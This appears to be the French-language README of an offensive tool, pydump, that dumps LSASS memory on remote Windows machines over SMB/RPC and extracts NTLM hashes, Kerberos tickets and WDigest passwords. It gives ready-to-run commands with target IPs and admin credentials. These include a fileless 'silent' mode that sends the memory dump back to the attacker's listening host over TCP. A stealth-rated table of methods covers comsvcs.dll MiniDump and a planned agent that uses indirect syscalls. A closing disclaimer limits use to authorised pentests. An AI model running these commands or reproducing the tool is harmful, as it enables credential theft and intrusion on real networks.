# pydump

Remote LSASS dump and credential extraction over SMB/RPC.

## Overview

pydump est un outil offensif qui permet de dumper la mémoire du processus LSASS sur une machine Windows distante et d'extraire les credentials (NTLM hashes, tickets Kerberos, mots de passe WDigest) sans interaction locale.

## Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                         ATTACKER (Linux)                             │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  ┌───────────┐    ┌──────────────┐    ┌──────────────────────────┐ │
│  │  CLI      │───►│  Orchestrator │───►│  Parser                  │ │
│  │  (cli.py) │    │  (smb + rpc)  │    │  (minidump + extract)    │ │
│  └───────────┘    └──────┬───────┘    └──────────────────────────┘ │
│                          │                                          │
└──────────────────────────┼──────────────────────────────────────────┘
                           │ SMB (445) + Named Pipes
                           ▼
┌─────────────────────────────────────────────────────────────────────┐
│                         TARGET (Windows)                             │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  ┌──────────────────┐    ┌───────────────────────────────────────┐ │
│  │  SVCCTL (RPC)    │───►│  Dump Method                          │ │
│  │  Service Manager  │    │  • comsvcs.dll (écrit sur disque)     │ │
│  └──────────────────┘    │  • silent (TCP callback, fileless)    │ │
│                           │  • agent natif (indirect syscalls) *  │ │
│                           └───────────────────────────────────────┘ │
│                                       │                             │
│                                       ▼                             │
│                              ┌─────────────────┐                   │
│                              │  lsass.exe      │                   │
│                              │  (mémoire)      │                   │
│                              └─────────────────┘                   │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘

* Méthode planifiée — agent C avec indirect syscalls + exfiltration via named pipe
```

### Modules

```
pydump/
├── cli.py              # Interface ligne de commande (argparse)
├── smb.py              # Session SMB2/3, named pipes, lecture/écriture de fichiers
├── dump/
│   ├── methods.py      # Stratégies de dump (comsvcs, silent, futur: agent)
│   └── receiver.py     # Serveur TCP pour recevoir le dump en callback
├── parser/
│   ├── minidump.py     # Parseur du format MDMP (streams, modules, mémoire)
│   └── extract.py      # Extraction des credentials (MSV1.0, WDigest, Kerberos)
└── rpc/
    ├── core.py         # Couche DCE/RPC (bind, request, response)
    ├── ndr.py          # Encodage/décodage NDR
    └── svcctl.py       # Interface SVCCTL (création/gestion de services)
```

## Installation

```bash
git clone <repo_url> && cd pydump
virtualenv env && source env/bin/activate && pip install -r requirements.txt
```

## Usage

### Dump + extraction automatique

```bash
python pydump.py dump -t 192.168.1.50 -u admin -p 'P@ssw0rd' -d CORP
```

### Méthode silent (fileless — callback TCP)

```bash
python pydump.py dump -t 192.168.1.50 -u admin -p 'P@ssw0rd' -m silent --lhost 192.168.1.10
```

### Dump sans parsing (sauvegarder le .dmp brut)

```bash
python pydump.py dump -t 192.168.1.50 -u admin -p 'P@ssw0rd' -o lsass.dmp --no-parse
```

### Parser un dump existant

```bash
python pydump.py parse -f lsass.dmp
```

## Méthodes de dump

| Méthode | Écriture disque | Furtivité | Description |
|---------|:-:|:-:|---|
| `comsvcs` | Oui (temporaire) | Faible | `rundll32 comsvcs.dll, MiniDump` — simple et fiable |
| `silent` | Non | Moyenne | PowerShell + .NET P/Invoke, exfiltration TCP directe |
| `agent` * | Non | Haute | Agent natif C, indirect syscalls, exfiltration named pipe |

\* En développement

## Prérequis

- Python >= 3.11
- Credentials avec droits administrateur local sur la cible
- Port 445/TCP ouvert (SMB)
- Pour la méthode `silent` : connectivité réseau retour (cible → attaquant)

## Avertissement

Cet outil est destiné à un usage autorisé uniquement (pentest, red team avec mandat). L'utilisation non autorisée sur des systèmes tiers est illégale.
